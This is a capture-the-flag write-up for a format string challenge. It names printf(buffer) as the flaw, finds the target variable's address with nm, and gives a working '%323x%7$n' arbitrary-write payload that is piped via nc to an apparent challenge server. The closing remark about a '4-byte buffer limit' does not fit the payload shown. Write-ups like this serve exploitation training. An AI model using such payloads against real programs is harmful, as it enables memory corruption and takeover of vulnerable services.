# Challenge `Write Specific Value` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format String Vulnerability (Arbitrary Write)
- Where: Where is the vulnerability present
  - In `vuln()` function at `printf(buffer);`. The buffer is fully controlled by user input via `read()` in `main()`.
- Impact: What results of exploiting this vulnerability
  - An attacker can overwrite global variables with controlled values. By writing the exact value 327 to target, the attacker can trigger the success condition and obtain the flag.

## Steps to reproduce

1. Identify the target variable
Run nm on the binary:
```sh
nm 04_write_specific | grep target
---------------
Output:
0804c040 B target
```
So we now know target is a global variable, located at address `0x0804c040`

2. By leaking the stack with `%x`, we observe that user input appears at offset 7, allowing `%7$n` to reference our injected address.

3. We want to write 327 to target. So we need the address bytes printed 4 and the padding 323

Python exploit:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25194
from pwn import *
import sys
sys.stdout.buffer.write(p32(0x0804c040) + b"%323x%7$n")
EOF
```

4. Result: printf interprets %7$n, writes the number of bytes printed so far (327) into target, the challenge condition is satisfied. Exploitation succeeds despite the 4-byte buffer limit